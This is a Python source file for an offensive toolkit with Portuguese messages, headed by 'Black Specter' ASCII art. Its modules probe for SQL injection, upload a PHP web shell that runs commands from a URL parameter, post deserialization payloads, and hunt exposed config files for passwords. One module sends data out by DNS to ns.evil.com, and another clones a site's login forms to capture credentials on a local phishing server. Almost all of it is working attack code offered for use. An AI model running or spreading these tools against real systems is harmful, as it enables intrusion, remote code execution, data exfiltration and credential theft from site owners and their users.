import argparse
import json
import requests
import socket
import base64
import paramiko
import io
import zipfile
import threading
import http.server
import socketserver
import urllib.parse
from bs4 import BeautifulSoup

ASCII_ART = r'''
███████████  ████                     █████                          
░░███░░░░░███░░███                    ░░███                          
 ░███    ░███ ░███   ██████    ██████  ░███ █████                    
 ░██████████  ░███  ░░░░░███  ███░░███ ░███░░███                     
 ░███░░░░░███ ░███   ███████ ░███ ░░░  ░██████░                      
 ░███    ░███ ░███  ███░░███ ░███  ███ ░███░░███                     
 ███████████  █████░░████████░░██████  ████ █████                    
░░░░░░░░░░░  ░░░░░  ░░░░░░░░  ░░░░░░  ░░░░ ░░░░░                     
                                                                    
                                                                    
                                                                    
  █████████                               █████                       
 ███░░░░░███                             ░░███                       
░███    ░░░  ████████   ██████   ██████  ███████    ██████  ████████
░░█████████ ░░███░░███ ███░░███ ███░░███░░░███░    ███░░███░░███░░███
 ░░░░░░░░███ ░███ ░███░███████ ░███ ░░░   ░███    ░███████  ░███ ░░░
 ███    ░███ ░███ ░███░███░░░  ░███  ███  ░███ ███░███░░░   ░███    
░░█████████  ░███████ ░░██████ ░░██████   ░░█████ ░░██████  █████   
 ░░░░░░░░░   ░███░░░   ░░░░░░   ░░░░░░     ░░░░░   ░░░░░░  ░░░░░   
             ░███                                                 
             █████                                                
            ░░░░░                                                 
'''

def log_info(msg):
    print(f"[INFO] {msg}")

def log_error(msg):
    print(f"[ERRO] {msg}")

def log_success(msg):
    print(f"[SUCESSO] {msg}")


class SQLiAutoExploit:
    def __init__(self, target, config):
        self.target = target.rstrip('/')
        self.vuln_path = config.get('vuln_path', '/vulnerable.php')
        self.param = config.get('param', 'id')
        self.test_payload = "' OR 1=1--"

    def run(self):
        url = f"{self.target}{self.vuln_path}"
        params = {self.param: self.test_payload}
        log_info(f"Tentando SQL Injection automática em {url} com payload: {self.test_payload}")
        try:
            r = requests.get(url, params=params, timeout=5)
            if r.status_code == 200 and ("sql" in r.text.lower() or "mysql" in r.text.lower() or "syntax" in r.text.lower()):
                log_success("Possível vulnerabilidade de SQL Injection detectada!")
                log_info(r.text[:300])
            else:
                log_info("Nenhum indício claro de SQL Injection encontrado.")
        except Exception as e:
            log_error(f"Erro na exploração SQLiAutoExploit: {e}")

class RCEUpload:
    def __init__(self, target, config):
        self.target = target.rstrip('/')
        self.upload_path = config.get('upload_path', '/upload.php')
        self.payload_content = config.get('payload_content', '<?php echo shell_exec($_GET["cmd"]); ?>')
        self.file_param = config.get('file_param', 'file')

    def run(self):
        url = f"{self.target}{self.upload_path}"
        files = {self.file_param: ('shell.php', self.payload_content, 'application/x-php')}
        log_info(f"Tentando upload para RCE em {url}")
        try:
            r = requests.post(url, files=files, timeout=5)
            if r.status_code == 200:
                log_success("Upload realizado, verificar execução remota enviando comando")
                log_info(r.text[:300])
            else:
                log_info(f"Upload falhou com status HTTP {r.status_code}")
        except Exception as e:
            log_error(f"Erro no RCEUpload: {e}")

class PhishingSimple:
    def __init__(self, target, config):
        self.phishing_url = config.get('phishing_url', 'http://malicious.com')

    def run(self):
        log_info(f"Atenção: ataque phishing simples - URL a ser exibida: {self.phishing_url}")

class DeserializationExploit:
    def __init__(self, target, config):
        self.target = target.rstrip('/')
        self.vuln_path = config.get('vuln_path', '/deserialize')
        self.payload = config.get('payload', '')

    def run(self):
        url = f"{self.target}{self.vuln_path}"
        headers = {'Content-Type': 'application/octet-stream'}
        try:
            data = base64.b64decode(self.payload) if self.payload else b''
        except Exception as e:
            log_error(f"Payload base64 inválido: {e}")
            return
        log_info(f"Tentando Exploração de deserialização em {url}")
        try:
            r = requests.post(url, data=data, headers=headers, timeout=5)
            if r.status_code == 200 and r.text.strip():
                log_success("Resposta indica possível sucesso na exploração de deserialização!")
                log_info(r.text[:300])
            else:
                log_info("Resposta sem indicações claras de sucesso.")
        except Exception as e:
            log_error(f"Erro no DeserializationExploit: {e}")

class BannerGrabber:
    def __init__(self, target, config):
        self.target = target
        self.port = int(config.get('port', 80))
        self.timeout = float(config.get('timeout', 3))

    def run(self):
        log_info(f"Capturando banner em {self.target}:{self.port}")
        try:
            s = socket.socket()
            s.settimeout(self.timeout)
            s.connect((self.target, self.port))
            s.send(b'HEAD / HTTP/1.0\r\n\r\n')
            banner = s.recv(1024).decode(errors='ignore')
            log_success(f"Banner capturado:\n{banner}")
            s.close()
        except Exception as e:
            log_error(f"Erro no BannerGrabber: {e}")

class DNSExfiltrationExample:
    def __init__(self, target, config):
        self.data = config.get('data', 'secretdata')
        self.dns_server = config.get('dns_server', 'ns.evil.com')

    def run(self):
        import dns.resolver
        import dns.message
        import dns.query
        import dns.name
        import dns.rdatatype
        import dns.rdataclass

        domain = f"{self.data}.{self.dns_server}"
        log_info(f"Enviando consulta DNS TXT para {domain} para exfiltração real")
        try:
            query = dns.message.make_query(domain, dns.rdatatype.TXT)
            response = dns.query.udp(query, self.dns_server, timeout=5)
            log_success("Consulta DNS enviada com sucesso.")
        except Exception as e:
            log_error(f"Erro ao enviar consulta DNS: {e}")

class ConfigFilePasswordFinder:
    def __init__(self, target, config):
        self.paths = config.get('paths', ['/config.php', '/config.json', '/settings.py'])
        self.target = target.rstrip('/')

    def run(self):
        log_info(f"Buscando arquivos de configuração expostos em {self.target}")
        for path in self.paths:
            url = f"{self.target}{path}"
            try:
                r = requests.get(url, timeout=5)
                if r.status_code == 200 and ('password' in r.text.lower() or 'passwd' in r.text.lower()):
                    log_success(f"Arquivo potencialmente sensível encontrado: {url}")
                    log_info(r.text[:300])
                else:
                    log_info(f"{url} não parece conter senhas expostas.")
            except Exception as e:
                log_error(f"Erro ao acessar {url}: {e}")

class PortScannerWithBanner:
    def __init__(self, target, config):
        self.target = target
        self.ports = config.get('ports', [80, 443])
        self.timeout = float(config.get('timeout', 2))

    def run(self):
        log_info(f"Escaneando portas em {self.target}")
        for port in self.ports:
            try:
                s = socket.socket()
                s.settimeout(self.timeout)
                result = s.connect_ex((self.target, port))
                if result == 0:
                    log_success(f"Porta {port} aberta")
                    try:
                        s.send(b'HEAD / HTTP/1.0\r\n\r\n')
                        banner = s.recv(1024).decode(errors='ignore').strip()
                        if banner:
                            log_info(f"Banner da porta {port}:\n{banner}")
                    except Exception:
                        log_info(f"Não foi possível capturar banner da porta {port}")
                else:
                    log_info(f"Porta {port} fechada")
                s.close()
            except Exception as e:
                log_error(f"Erro ao escanear porta {port}: {e}")


class PhishingAdvanced:

    class PhishingHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
        def __init__(self, *args, **kwargs):
            self.phishing_instance = kwargs.pop('phishing_instance')
            super().__init__(*args, **kwargs)

        def do_GET(self):
            if self.path == '/' or self.path == '/index.html':
                self.send_response(200)
                self.send_header('Content-type', 'text/html')
                self.end_headers()
                self.wfile.write(self.phishing_instance.modified_html.encode('utf-8'))
            else:
                self.send_error(404, "Not Found")

        def do_POST(self):
            content_length = int(self.headers.get('Content-Length', 0))
            post_data = self.rfile.read(content_length)
            parsed = urllib.parse.parse_qs(post_data.decode('utf-8'))
            self.phishing_instance.captured_data.append(parsed)
            print("[SUCESSO] Dados capturados:")
            for key, value in parsed.items():
                print(f"  {key}: {value}")
            self.send_response(302)
            self.send_header('Location', self.phishing_instance.target_url)
            self.end_headers()

    def __init__(self, target, config):
        self.target_url = target
        self.port = int(config.get('port', 8080))
        self.html_content = ""
        self.modified_html = ""
        self.captured_data = []

    def fetch_and_modify(self):
        log_info(f"Baixando conteúdo de {self.target_url} ...")
        try:
            resp = requests.get(self.target_url, timeout=10)
            resp.raise_for_status()
            self.html_content = resp.text
        except Exception as e:
            log_error(f"Falha ao baixar o HTML: {e}")
            return False

        soup = BeautifulSoup(self.html_content, "html.parser")

        forms = soup.find_all("form")
        if not forms:
            log_info("[AVISO] Nenhum formulário encontrado na página. Nada para capturar.")
        for form in forms:
            form['method'] = 'POST'
            form['action'] = '/'

            hidden = soup.new_tag("input", type="hidden", name="phishing", value="true")
            form.insert(0, hidden)

        self.modified_html = str(soup)
        return True

    def run_server(self):
        handler = lambda *args, **kwargs: self.PhishingHTTPRequestHandler(*args, phishing_instance=self, **kwargs)
        with socketserver.TCPServer(("", self.port), handler) as httpd:
            log_success(f"Servidor phishing rodando na porta {self.port}. Acesse http://localhost:{self.port}")
            try:
                httpd.serve_forever()
            except KeyboardInterrupt:
                log_info("Servidor phishing parado pelo usuário.")

    def run(self):
        if not self.fetch_and_modify():
            return
        self.run_server()


def main():
    parser = argparse.ArgumentParser(description="Toolkit de Exploração")
    parser.add_argument('module', help='Módulo para executar (ex: sqli, rceupload, phishing, deserialization, bannergrab, dnsexfil, configpass, portscan)')
    parser.add_argument('target', help='Alvo principal (ex: http://exemplo.com ou IP)')
    parser.add_argument('--config', help='Arquivo JSON com configuração extra', default=None)

    args = parser.parse_args()

    config = {}
    if args.config:
        try:
            with open(args.config, 'r') as f:
                config = json.load(f)
        except Exception as e:
            log_error(f"Falha ao carregar config JSON: {e}")
            return

    module = args.module.lower()
    target = args.target

    modules = {
        'sqli': SQLiAutoExploit,
        'rceupload': RCEUpload,
        'phishing': PhishingAdvanced,  
        'deserialization': DeserializationExploit,
        'bannergrab': BannerGrabber,
        'dnsexfil': DNSExfiltrationExample,
        'configpass': ConfigFilePasswordFinder,
        'portscan': PortScannerWithBanner,
    }

    if module not in modules:
        log_error(f"Módulo desconhecido: {module}")
        return

    instance = modules[module](target, config)
    instance.run()

if __name__ == "__main__":
    print(ASCII_ART)
    main()
